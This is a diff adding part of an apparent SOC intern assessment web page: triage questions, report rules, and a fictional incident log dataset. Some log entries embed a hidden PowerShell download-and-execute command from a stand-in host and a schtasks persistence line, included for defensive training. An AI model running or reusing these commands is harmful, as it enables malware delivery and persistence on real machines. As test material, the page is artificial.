+          <div class="choices" data-choice="c2q1">
+            <button class="choice" data-val="Legitimate">Legitimate</button>
+            <button class="choice" data-val="Phishing">Phishing</button>
+            <button class="choice" data-val="Inconclusive">Inconclusive</button>
+          </div>
+        </div>
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q2</span><span class="qtitle">List at least five indicators that drove your decision</span></div>
+          <textarea class="tall" data-a="c2q2"></textarea>
+        </div>
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q3</span><span class="qtitle">What is the likely objective of this campaign?</span></div>
+          <textarea data-a="c2q3"></textarea>
+        </div>
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q4</span><span class="qtitle">What would you do if an employee had clicked the link?</span></div>
+          <textarea data-a="c2q4"></textarea>
+        </div>
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q5</span><span class="qtitle">What additional evidence would you investigate?</span></div>
+          <textarea data-a="c2q5"></textarea>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ 04 CHALLENGE 3 ============ -->
+    <section id="s-c3">
+      <div class="sec-head"><span class="sec-num">04</span><h2>Challenge 3 — You are the SOC analyst</h2><span class="sev sev-low">10 min suggested</span></div>
+      <p class="sec-sub">Five alerts land in your queue at the same moment. Rank them 1 (work first) to 5 (work last) and explain your reasoning. The severity shown is what the tool assigned — it is not necessarily what you should act on.</p>
+
+      <div class="card">
+        <div class="alertrow">
+          <div class="alertkey">A</div>
+          <div class="alerttxt">Multiple failed logins against a public-facing Linux server</div>
+          <div><span class="sev sev-medium">Medium</span></div>
+          <div><select data-rank="A"><option value="">Rank…</option><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option></select></div>
+        </div>
+        <div class="alertrow">
+          <div class="alertkey">B</div>
+          <div class="alerttxt">PowerShell executed by an IT administrator during scheduled maintenance</div>
+          <div><span class="sev sev-high">High</span></div>
+          <div><select data-rank="B"><option value="">Rank…</option><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option></select></div>
+        </div>
+        <div class="alertrow">
+          <div class="alertkey">C</div>
+          <div class="alerttxt">User clicked a suspicious phishing link and then successfully authenticated</div>
+          <div><span class="sev sev-high">High</span></div>
+          <div><select data-rank="C"><option value="">Rank…</option><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option></select></div>
+        </div>
+        <div class="alertrow">
+          <div class="alertkey">D</div>
+          <div class="alerttxt">AWS access key created from an unusual location immediately after a suspicious login</div>
+          <div><span class="sev sev-critical">Critical</span></div>
+          <div><select data-rank="D"><option value="">Rank…</option><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option></select></div>
+        </div>
+        <div class="alertrow">
+          <div class="alertkey">E</div>
+          <div class="alerttxt">Windows Defender updated successfully</div>
+          <div><span class="sev sev-low">Low</span></div>
+          <div><select data-rank="E"><option value="">Rank…</option><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option></select></div>
+        </div>
+        <div id="rankWarn" class="tcount"></div>
+
+        <div class="qblock" style="margin-top:12px">
+          <div class="qhead"><span class="qid">Q1</span><span class="qtitle">Explain your ranking</span></div>
+          <div class="qhelp">Address risk, context, correlation between alerts, and potential business impact.</div>
+          <textarea class="tall" data-a="c3j"></textarea>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ 05 COMMS ============ -->
+    <section id="s-comms">
+      <div class="sec-head"><span class="sec-num">05</span><h2>Communication</h2><span class="sev sev-medium">best left to the write-up window</span></div>
+      <p class="sec-sub">Two short pieces of writing. Both are scored on accuracy and restraint as much as on clarity — do not state as fact anything the evidence has not confirmed.</p>
+
+      <div class="card">
+        <div class="qblock">
+          <div class="qhead"><span class="qid">A</span><span class="qtitle">Incident summary for the CTO</span></div>
+          <div class="qhelp">The CTO has no security background. Cover: what happened, which systems and users may be affected, business impact, your current confidence level, and the immediate action you recommend. Maximum 150 words. Avoid jargon.</div>
+          <textarea class="tall" data-a="commsCto" data-words="150"></textarea>
+          <div class="counter" data-for="commsCto"></div>
+        </div>
+        <div class="qblock">
+          <div class="qhead"><span class="qid">B</span><span class="qtitle">Customer notification</span></div>
+          <div class="qhelp">You are contacting the customer to inform them that suspicious activity has been detected. Professional, factual, and free of any claim that has not been confirmed. Maximum 200 words.</div>
+          <textarea class="tall" data-a="commsCustomer" data-words="200"></textarea>
+          <div class="counter" data-for="commsCustomer"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ 06 SUBMISSION REQUIREMENTS ============ -->
+    <section id="s-submit-req">
+      <div class="sec-head"><span class="sec-num">06</span><h2>Report requirements</h2></div>
+      <p class="sec-sub">The in-app answers are your working notes. The graded deliverable is a written investigation report, emailed to <a href="mailto:timuzin.razit@brainstation-23.com">timuzin.razit@brainstation-23.com</a> within <b>24 hours of the invitation email Brain Station 23 sent you</b>.</p>
+
+      <div class="grid2">
+        <div class="card">
+          <h3 style="font-size:15px;margin-bottom:8px">1. Investigation report</h3>
+          <p style="color:var(--dim);font-size:13.5px">PDF preferred. Use this structure:</p>
+          <ol class="ol">
+            <li>Executive summary</li>
+            <li>Investigation findings</li>
+            <li>Timeline (normalised to a single timezone)</li>
+            <li>Affected assets</li>
+            <li>Indicators of compromise</li>
+            <li>MITRE ATT&amp;CK mapping</li>
+            <li>Severity assessment</li>
+            <li>Immediate response</li>
+            <li>Additional evidence required</li>
+            <li>Analyst confidence and assumptions</li>
+          </ol>
+        </div>
+        <div class="card">
+          <h3 style="font-size:15px;margin-bottom:8px">2. Phishing analysis</h3>
+          <ul class="ol"><li>Verdict</li><li>Supporting evidence</li><li>Attack objective</li><li>Recommended response</li></ul>
+          <h3 style="font-size:15px;margin:16px 0 8px">3. Analyst decision making</h3>
+          <ul class="ol"><li>Your alert ranking</li><li>Justification for the order</li></ul>
+          <h3 style="font-size:15px;margin:16px 0 8px">4. Communication</h3>
+          <ul class="ol"><li>CTO summary (≤150 words)</li><li>Customer notification (≤200 words)</li></ul>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3 style="font-size:15px;margin-bottom:8px">How to submit</h3>
+        <p style="color:var(--dim);font-size:14px">Export your working notes below, write the report offline, then email a single PDF plus your exported notes file to <a href="mailto:timuzin.razit@brainstation-23.com">timuzin.razit@brainstation-23.com</a> with the subject line <code>SOC Intern Assessment — &lt;your name&gt;</code>. The deadline is <b>24 hours from the timestamp on your invitation email</b>, so the earlier in that window you start the session, the more time you have to write. Late submissions are accepted only with prior notice.</p>
+        <div class="toolbar" style="margin:14px 0 0">
+          <button class="btn" id="expNotes">Export answers (.md)</button>
+          <button class="btn" id="expJson">Export raw answers (.json)</button>
+          <button class="btn" id="expTemplate">Download report template (.md)</button>
+          <button class="btn ghost" id="impBtn">Restore from .json</button>
+          <input type="file" id="impFile" accept="application/json,.json" class="hidden">
+        </div>
+        <p style="margin-top:10px;color:var(--faint);font-size:12.5px">Export at least once before the 2-hour mark and again at the end. Browser storage in this environment is best-effort and is not a backup.</p>
+      </div>
+    </section>
+
+    <!-- ============ 07 RULES ============ -->
+    <section id="s-rules">
+      <div class="sec-head"><span class="sec-num">07</span><h2>Assessment rules</h2></div>
+      <div class="card">
+        <ul class="ol" style="font-size:14px;line-height:1.7">
+          <li>The investigation window is 2 hours and starts when you press <b style="color:var(--text)">Start assessment</b>. It does not pause.</li>
+          <li>At 2 hours the dataset locks permanently — search, filters and raw logs close and do not reopen.</li>
+          <li>You then have 30 more minutes to finish your answers from your own notes. At 2 hours 30 minutes everything locks.</li>
+          <li>Refreshing or closing the page does not reset the clock. The deadline is stored, not the time remaining.</li>
+          <li>The written report is due by email <b style="color:var(--text)">within 24 hours of the invitation email you received from Brain Station 23</b>. That clock runs independently of this one and started before you opened this page.</li>
+          <li>External references, documentation and tooling are allowed. Decoding, lookups and note-taking are expected.</li>
+          <li>You may use AI assistance. You must disclose it in section 08 and paste the prompts you used. Prompting is a skill we are interested in; concealment is not a risk worth taking.</li>
+          <li>You must be able to defend every line of your report in a live interview. Answers you cannot explain are treated as unsupported, whoever wrote them.</li>
+          <li>Do not fabricate evidence. An invented IP, hash or log line is an automatic fail.</li>
+          <li>Every conclusion is labelled FACT, HYPOTHESIS, CONFIRMED or UNKNOWN.</li>
+          <li>All data here is fictional. Do not attempt to resolve, scan or contact any domain or address in the dataset.</li>
+          <li>The login page in Challenge 2 is an inert mockup. It does not collect or transmit anything. Never enter a real credential into it.</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ============ 08 AI USE ============ -->
+    <section id="s-ai">
+      <div class="sec-head"><span class="sec-num">08</span><h2>AI use disclosure</h2><span class="sev sev-low">required</span></div>
+      <p class="sec-sub">Using an AI assistant is allowed and is not held against you. Hiding it is. We read this section to understand how you direct a tool, which is a real SOC skill — vague prompting produces confident nonsense, and confident nonsense is the failure mode this whole assessment is built to catch.</p>
+
+      <div class="card">
+        <div class="warnbox" style="margin-bottom:16px">Undisclosed AI use discovered during the interview ends the application. Disclosed AI use, with the prompts, costs you nothing.</div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">A1</span><span class="qtitle">Did you use an AI assistant for any part of this assessment?</span></div>
+          <div class="choices" data-choice="aiUsed">
+            <button class="choice" data-val="No">No</button>
+            <button class="choice" data-val="Yes">Yes</button>
+          </div>
+        </div>
+
+        <div id="aiFields">
+          <div class="qblock">
+            <div class="qhead"><span class="qid">A2</span><span class="qtitle">Which tool or tools, and for which parts?</span></div>
+            <div class="qhelp">For example: log triage, decoding, MITRE mapping, drafting the CTO summary, proofreading.</div>
+            <textarea data-a="aiTools"></textarea>
+          </div>
+
+          <div class="qblock">
+            <div class="qhead"><span class="qid">A3</span><span class="qtitle">Paste the exact prompts you used</span></div>
+            <div class="qhelp">Copy them verbatim, including follow-ups. Do not tidy them up — the rough version is more useful to us than a polished one. If you ran many, paste the ones that actually shaped your answer.</div>
+            <textarea class="tall" data-a="aiPrompts" style="min-height:220px" placeholder="Prompt 1:&#10;&#10;Prompt 2:&#10;&#10;…"></textarea>
+          </div>
+
+          <div class="qblock">
+            <div class="qhead"><span class="qid">A4</span><span class="qtitle">What did the AI get wrong, and what did you reject?</span></div>
+            <div class="qhelp">Name at least one thing you checked and overruled. If the answer is genuinely "nothing", say so and explain how you verified it.</div>
+            <textarea data-a="aiRejected"></textarea>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ 09 FINAL ============ -->
+    <section id="s-final">
+      <div class="sec-head"><span class="sec-num">09</span><h2>Final submission</h2></div>
+      <p class="sec-sub">Confirm the checklist, then lock your answers. You can still export your notes after submitting.</p>
+      <div class="card">
+        <div class="toolbar">
+          <input type="text" id="candName" placeholder="Full name" style="min-width:220px">
+          <input type="email" id="candEmail" placeholder="Email address" style="min-width:240px">
+        </div>
+        <div style="margin-top:8px">
+          <label class="check"><input type="checkbox" data-ck="1"><span>I answered every question in Challenges 1, 2 and 3.</span></label>
+          <label class="check"><input type="checkbox" data-ck="2"><span>Every conclusion in my notes cites an Event ID or is labelled UNKNOWN.</span></label>
+          <label class="check"><input type="checkbox" data-ck="3"><span>I normalised timestamps to a single timezone and said which one.</span></label>
+          <label class="check"><input type="checkbox" data-ck="4"><span>I separated confirmed findings from hypotheses.</span></label>
+          <label class="check"><input type="checkbox" data-ck="5"><span>My CTO summary is 150 words or fewer and my customer notification is 200 words or fewer.</span></label>
+          <label class="check"><input type="checkbox" data-ck="6"><span>I have exported my answers and will email the PDF report to timuzin.razit@brainstation-23.com within 24 hours of my invitation email.</span></label>
+          <label class="check"><input type="checkbox" data-ck="7"><span>I did not invent any evidence, and I can defend every finding in a live interview.</span></label>
+          <label class="check"><input type="checkbox" data-ck="8"><span>I completed the AI use disclosure honestly, including the prompts if I used one.</span></label>
+        </div>
+        <div class="toolbar" style="margin-top:16px">
+          <button class="btn primary" id="submitBtn">Submit assessment</button>
+          <span class="savechip" id="submitState"></span>
+        </div>
+      </div>
+    </section>
+    <footer style="border-top:1px solid var(--line);padding:18px 0 0;margin-top:10px;color:var(--faint);font-size:12.5px;font-family:var(--mono)">
+      All rights reserved to CyberStation by Brain Station 23. &nbsp;·&nbsp; All companies, domains, addresses and data in this assessment are fictional.
+    </footer>
+  </main>
+</div>
+
+<!-- ============ START GATE ============ -->
+<div class="gate" id="gate">
+  <div class="gatecard">
+    <h2>Before you start</h2>
+    <p style="color:var(--dim);font-size:14px">You have 2 hours to investigate, then a further 30 minutes to finish writing without the dataset. You may use external references and tools, but your final conclusions must be supported by evidence from the supplied dataset.</p>
+    <div class="warnbox" style="margin:16px 0">The clock starts the moment you press start and cannot be paused. At 2:00 the dataset closes for good — export or copy what you need before then. At 2:30 every field locks. Your PDF report is due <b>24 hours after the invitation email you received from Brain Station 23</b>, so do not leave the session until late in that window.</div>
+    <div style="display:flex;gap:10px;flex-wrap:wrap">
+      <button class="btn primary" id="gateStart">Start assessment</button>
+      <button class="btn ghost" id="gatePreview">Read the briefing first</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============ CONFIRM MODAL ============ -->
+<div class="modal" id="confirmModal">
+  <div class="gatecard" style="max-width:520px">
+    <h2 id="cmTitle">Submit assessment?</h2>
+    <p style="color:var(--dim);font-size:14px" id="cmBody">Your in-app answers will be locked and can no longer be edited. You will still be able to export them. The written report remains due within 24 hours.</p>
+    <div style="display:flex;gap:10px;margin-top:18px">
+      <button class="btn primary" id="cmYes">Yes, submit</button>
+      <button class="btn ghost" id="cmNo">Go back</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+"use strict";
+
+/* ============================================================
+   FinSecure SOC Intern Assessment — candidate build
+   No answer key, no scoring logic and no attack narrative
+   is present in this file.
+   ============================================================ */
+
+/* ---------- storage shim: sandbox-safe, falls back to memory ---------- */
+const mem = {};
+const Store = {
+  async get(k){
+    try{ if(window.storage){ const r = await window.storage.get(k,false); return r ? r.value : null; } }catch(e){}
+    return k in mem ? mem[k] : null;
+  },
+  async set(k,v){
+    mem[k]=v;
+    try{ if(window.storage) await window.storage.set(k,v,false); }catch(e){}
+  }
+};
+const KEY = "finsec-soc-assessment-v1";
+
+/* ---------- dataset ----------
+   96 events. Windows Security and Sysmon are recorded in host local
+   time (BDT, UTC+6). Wazuh, firewall, CloudTrail and the email
+   gateway record in UTC. Event IDs reflect ingestion order per
+   source, not chronological order.
+------------------------------------------------------------------- */
+const B = "2026-08-27";
+const EVENTS = [
+/* --- Windows Security (BDT) --- */
+{id:"E001",ts:B+" 08:41:03 BDT",src:"Windows Security",host:"IT-WKS-003",user:"FINSEC\\a.karim",sip:"10.20.14.3",dip:"-",proc:"winlogon.exe",evt:"4624 Successful Logon (Type 2)",sev:"Informational",raw:"EventID=4624  LogonType=2  TimeCreated=2026-08-27T08:41:03.221 (UTC+06:00 Bangladesh Standard Time)\nComputer=IT-WKS-003.finsec.local\nTargetUserName=a.karim  TargetDomainName=FINSEC\nWorkstationName=IT-WKS-003  IpAddress=127.0.0.1\nLogonProcessName=User32  AuthenticationPackageName=Negotiate"},
+{id:"E003",ts:B+" 09:05:44 BDT",src:"Windows Security",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"winlogon.exe",evt:"4624 Successful Logon (Type 2)",sev:"Informational",raw:"EventID=4624  LogonType=2  TimeCreated=2026-08-27T09:05:44.882 (UTC+06:00 Bangladesh Standard Time)\nComputer=FIN-WKS-042.finsec.local\nTargetUserName=r.hasan  TargetDomainName=FINSEC\nIpAddress=127.0.0.1  LogonProcessName=User32\nDescription=first interactive logon of the working day"},
+{id:"E004",ts:B+" 09:06:02 BDT",src:"Windows Security",host:"SRV-DC01",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"10.20.5.10",proc:"lsass.exe",evt:"4624 Successful Logon (Type 3)",sev:"Informational",raw:"EventID=4624  LogonType=3  TimeCreated=2026-08-27T09:06:02.147 (UTC+06:00)\nComputer=SRV-DC01.finsec.local\nTargetUserName=r.hasan  IpAddress=10.20.14.42  IpPort=49882\nAuthenticationPackageName=Kerberos"},
+{id:"E006",ts:B+" 02:00:04 BDT",src:"Windows Security",host:"SRV-BKP01",user:"FINSEC\\svc_backup",sip:"10.20.5.60",dip:"-",proc:"services.exe",evt:"4624 Successful Logon (Type 5)",sev:"Informational",raw:"EventID=4624  LogonType=5 (Service)  TimeCreated=2026-08-27T02:00:04.001 (UTC+06:00)\nComputer=SRV-BKP01.finsec.local\nTargetUserName=svc_backup  ServiceName=FinSecure Backup Agent\nSchedule=nightly 02:00 local"},
+{id:"E008",ts:B+" 09:12:33 BDT",src:"Windows Security",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"OUTLOOK.EXE",evt:"4688 Process Creation",sev:"Informational",raw:"EventID=4688  TimeCreated=2026-08-27T09:12:33.402 (UTC+06:00)\nNewProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\nParentProcessName=C:\\Windows\\explorer.exe\nTokenElevationType=%%1938 (limited)"},
+{id:"E009",ts:B+" 11:20:15 BDT",src:"Windows Security",host:"SRV-APP02",user:"FINSEC\\m.rahman",sip:"203.0.113.199",dip:"10.20.5.31",proc:"svchost.exe",evt:"4624 Successful Logon (Type 10)",sev:"Medium",raw:"EventID=4624  LogonType=10 (RemoteInteractive)  TimeCreated=2026-08-27T11:20:15.640 (UTC+06:00)\nComputer=SRV-APP02.finsec.local\nTargetUserName=m.rahman  IpAddress=203.0.113.199  IpPort=51204\nNote=203.0.113.199 = NorthBridge MSP managed-services jump host, documented in CMDB asset MSP-JMP-01\nAccess path: site-to-site VPN, allow-listed since 2024-11"},
+{id:"E011",ts:B+" 13:05:12 BDT",src:"Windows Security",host:"SRV-FILE01",user:"FINSEC\\svc_scan",sip:"10.20.9.200",dip:"10.20.5.20",proc:"lsass.exe",evt:"4625 Failed Logon",sev:"Medium",raw:"EventID=4625  TimeCreated=2026-08-27T13:05:12.330 (UTC+06:00)\nTargetUserName=svc_scan  Status=0xC000006D  SubStatus=0xC000006A (bad password)\nIpAddress=10.20.9.200  LogonType=3\nNote=10.20.9.200 = SRV-VULN01 credentialed vulnerability scanner"},
+{id:"E014",ts:B+" 15:31:04 BDT",src:"Windows Security",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"chrome.exe",evt:"4688 Process Creation",sev:"Informational",raw:"EventID=4688  TimeCreated=2026-08-27T15:31:04.019 (UTC+06:00 Bangladesh Standard Time)\nNewProcessName=C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\nParentProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\nCommandLine=\"chrome.exe\" --single-argument https://login.finsecure-security.example/verify"},
+{id:"E015",ts:B+" 15:52:10 BDT",src:"Windows Security",host:"IT-WKS-003",user:"FINSEC\\a.karim",sip:"10.20.14.3",dip:"-",proc:"powershell.exe",evt:"4688 Process Creation",sev:"High",raw:"EventID=4688  TimeCreated=2026-08-27T15:52:10.774 (UTC+06:00)\nNewProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentProcessName=C:\\Windows\\CCM\\CcmExec.exe\nCommandLine=powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AUQB1AGkAYwBrAEYAaQB4AEUAbgBnAGkAbgBlAGUAcgBpAG4AZwAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAASABvAHQARgBpAHgASQBEACwASQBuAHMAdABhAGwAbABlAGQATwBuACAAfAAgAEUAeABwAG8AcgB0AC0AQwBzAHYAIAAtAFAAYQB0AGgAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABJAFQAQQBNAFwAcABhAHQAYwBoAF8AaQBuAHYAZQBuAHQAbwByAHkALgBjAHMAdgAgAC0ATgBvAFQAeQBwAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAA=="},
+{id:"E016",ts:B+" 16:12:41 BDT",src:"Windows Security",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"powershell.exe",evt:"4688 Process Creation",sev:"High",raw:"EventID=4688  TimeCreated=2026-08-27T16:12:41.208 (UTC+06:00)\nNewProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentProcessName=C:\\Windows\\explorer.exe\nCommandLine=powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://cdn-updates.example/tk.ps1')\"\nTokenElevationType=%%1938 (limited)"},
+{id:"E017",ts:B+" 16:13:02 BDT",src:"Windows Security",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"schtasks.exe",evt:"4688 Process Creation",sev:"High",raw:"EventID=4688  TimeCreated=2026-08-27T16:13:02.661 (UTC+06:00)\nNewProcessName=C:\\Windows\\System32\\schtasks.exe\nParentProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine=schtasks /create /sc minute /mo 5 /tn \"EdgeUpdateTaskUserS-1-5-21-4471\" /tr \"powershell -w hidden -f %APPDATA%\\Microsoft\\Windows\\upd.ps1\" /f"},
+{id:"E018",ts:B+" 16:41:19 BDT",src:"Windows Security",host:"SRV-FILE01",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"10.20.5.20",proc:"lsass.exe",evt:"4624 Successful Logon (Type 3)",sev:"Informational",raw:"EventID=4624  LogonType=3  TimeCreated=2026-08-27T16:41:19.884 (UTC+06:00)\nTargetUserName=r.hasan  IpAddress=10.20.14.42\nShare=\\\\SRV-FILE01\\Finance  AccessMask=ReadData\nNote=file share access is routine for this account; no bulk read counters recorded on this server"},
+{id:"E019",ts:B+" 17:02:33 BDT",src:"Windows Security",host:"FIN-WKS-042",user:"NT AUTHORITY\\SYSTEM",sip:"10.20.14.42",dip:"-",proc:"MpCmdRun.exe",evt:"4688 Process Creation",sev:"Informational",raw:"EventID=4688  TimeCreated=2026-08-27T17:02:33.115 (UTC+06:00)\nNewProcessName=C:\\Program Files\\Windows Defender\\MpCmdRun.exe\nParentProcessName=C:\\Program Files\\Windows Defender\\MsMpEng.exe\nCommandLine=\"MpCmdRun.exe\" -SignatureUpdate -ScheduleJob"},
+
+/* --- Sysmon (BDT) --- */
+{id:"E021",ts:B+" 08:40:12 BDT",src:"Sysmon",host:"FIN-WKS-042",user:"NT AUTHORITY\\SYSTEM",sip:"10.20.14.42",dip:"-",proc:"Sysmon64.exe",evt:"Sysmon 16 Configuration Change",sev:"Informational",raw:"EventID=16  TimeCreated=2026-08-27T08:40:12.005 (UTC+06:00)\nConfiguration=finsec-sysmon-v3.1.xml\nUtcTime field disabled in this deployment; events are stamped in host local time\nRuleGroup notes: FileCreate (EventID 11) limited to *.exe *.dll *.lnk on workstations to control log volume\nScriptBlockLogging=Disabled  ModuleLogging=Disabled"},
+{id:"E023",ts:B+" 15:31:04 BDT",src:"Sysmon",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"chrome.exe",evt:"Sysmon 1 Process Creation",sev:"Medium",raw:"EventID=1  TimeCreated=2026-08-27T15:31:04.021 (UTC+06:00)\nImage=C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\nParentImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\nCommandLine=\"chrome.exe\" --single-argument https://login.finsecure-security.example/verify\nHashes=SHA256=9F31C2A6D4E85B70C1A2F0D9E3B7648C5A1D0E92F7B34C86D5A0E1F2C3B49807\nUser=FINSEC\\r.hasan"},
+{id:"E024",ts:B+" 15:31:12 BDT",src:"Sysmon",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"chrome.exe",evt:"Sysmon 22 DNS Query",sev:"Medium",raw:"EventID=22  TimeCreated=2026-08-27T15:31:12.377 (UTC+06:00)\nQueryName=account-verification.example\nQueryResults=type:5 login.finsecure-security.example;type:1 172.67.188.94;\nImage=chrome.exe  User=FINSEC\\r.hasan"},
+{id:"E025",ts:B+" 15:31:13 BDT",src:"Sysmon",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"172.67.188.94",proc:"chrome.exe",evt:"Sysmon 3 Network Connection",sev:"Medium",raw:"EventID=3  TimeCreated=2026-08-27T15:31:13.004 (UTC+06:00)\nImage=chrome.exe  Protocol=tcp  DestinationIp=172.67.188.94  DestinationPort=443\nDestinationHostname=account-verification.example  Initiated=true"},
+{id:"E028",ts:B+" 15:52:10 BDT",src:"Sysmon",host:"IT-WKS-003",user:"FINSEC\\a.karim",sip:"10.20.14.3",dip:"-",proc:"powershell.exe",evt:"Sysmon 1 Process Creation",sev:"High",raw:"EventID=1  TimeCreated=2026-08-27T15:52:10.776 (UTC+06:00)\nImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentImage=C:\\Windows\\CCM\\CcmExec.exe\nParentCommandLine=CcmExec.exe -RunTask ITAM-PatchInventory-Weekly\nCommandLine=powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AUQB1AGkAYwBrAEYAaQB4AEUAbgBnAGkAbgBlAGUAcgBpAG4AZwAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAASABvAHQARgBpAHgASQBEACwASQBuAHMAdABhAGwAbABlAGQATwBuACAAfAAgAEUAeABwAG8AcgB0AC0AQwBzAHYAIAAtAFAAYQB0AGgAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABJAFQAQQBNAFwAcABhAHQAYwBoAF8AaQBuAHYAZQBuAHQAbwByAHkALgBjAHMAdgAgAC0ATgBvAFQAeQBwAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAA==\nHashes=SHA256=5B2E1C90A47D3F8621C0B9E4D7A5308F1C6E29B0D4A83F7512C0E9B6A3D81F40"},
+{id:"E029",ts:B+" 15:52:14 BDT",src:"Sysmon",host:"IT-WKS-003",user:"FINSEC\\a.karim",sip:"10.20.14.3",dip:"-",proc:"powershell.exe",evt:"Sysmon 11 File Create",sev:"Low",raw:"EventID=11  TimeCreated=2026-08-27T15:52:14.902 (UTC+06:00)\nTargetFilename=C:\\ProgramData\\ITAM\\patch_inventory.csv\nImage=powershell.exe  User=FINSEC\\a.karim\nNote=IT-WKS-003 runs an extended Sysmon config that logs all FileCreate events"},
+{id:"E030",ts:B+" 16:12:41 BDT",src:"Sysmon",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"powershell.exe",evt:"Sysmon 1 Process Creation",sev:"Critical",raw:"EventID=1  TimeCreated=2026-08-27T16:12:41.210 (UTC+06:00)\nImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentImage=C:\\Windows\\explorer.exe\nParentCommandLine=C:\\Windows\\explorer.exe\nCommandLine=powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://cdn-updates.example/tk.ps1')\"\nHashes=SHA256=5B2E1C90A47D3F8621C0B9E4D7A5308F1C6E29B0D4A83F7512C0E9B6A3D81F40\nUser=FINSEC\\r.hasan  IntegrityLevel=Medium\nNote=no preceding EventID 1 or 11 explains how this command line reached the host"},
+{id:"E031",ts:B+" 16:12:42 BDT",src:"Sysmon",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"powershell.exe",evt:"Sysmon 22 DNS Query",sev:"High",raw:"EventID=22  TimeCreated=2026-08-27T16:12:42.045 (UTC+06:00)\nQueryName=cdn-updates.example\nQueryResults=type:1 91.219.236.18;\nImage=powershell.exe"},
+{id:"E032",ts:B+" 16:12:43 BDT",src:"Sysmon",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"91.219.236.18",proc:"powershell.exe",evt:"Sysmon 3 Network Connection",sev:"High",raw:"EventID=3  TimeCreated=2026-08-27T16:12:43.611 (UTC+06:00)\nImage=powershell.exe  Protocol=tcp  DestinationIp=91.219.236.18  DestinationPort=80\nDestinationHostname=cdn-updates.example  Initiated=true"},
+{id:"E033",ts:B+" 16:13:02 BDT",src:"Sysmon",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"schtasks.exe",evt:"Sysmon 1 Process Creation",sev:"High",raw:"EventID=1  TimeCreated=2026-08-27T16:13:02.663 (UTC+06:00)\nImage=C:\\Windows\\System32\\schtasks.exe\nParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine=schtasks /create /sc minute /mo 5 /tn \"EdgeUpdateTaskUserS-1-5-21-4471\" /tr \"powershell -w hidden -f %APPDATA%\\Microsoft\\Windows\\upd.ps1\" /f\nUser=FINSEC\\r.hasan"},
+{id:"E034",ts:B+" 16:18:44 BDT",src:"Sysmon",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"91.219.236.18",proc:"powershell.exe",evt:"Sysmon 3 Network Connection",sev:"High",raw:"EventID=3  TimeCreated=2026-08-27T16:18:44.077 (UTC+06:00)\nImage=powershell.exe  DestinationIp=91.219.236.18  DestinationPort=443  Initiated=true"},
